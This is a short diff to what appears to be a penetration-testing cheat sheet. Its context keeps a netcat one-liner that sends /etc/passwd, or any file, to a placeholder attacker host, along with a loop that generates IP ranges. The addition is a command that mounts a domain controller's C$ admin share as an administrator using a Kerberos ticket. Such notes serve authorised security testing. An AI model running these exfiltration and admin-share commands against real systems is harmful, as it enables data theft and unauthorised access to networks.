@@ -62,3 +62,7 @@ nc <attacker_ip_addr> 31337 < /etc/passwd # replace /etc/passwd with whatever fi
 ```bash
 for i in $(seq 1 255); do echo "10.10.$i.1-255"; done | tr "\n" ","
 ```
+### Mount a CIFS share with your Kerberos ticket on Linux 
+```bash
+sudo mount -t cifs -o "sec=krb5,cruid=$UID,user=Administrateur,domain=http://FOO.BAR" //AD1.FOO.BAR/C$ /mnt/test
+```
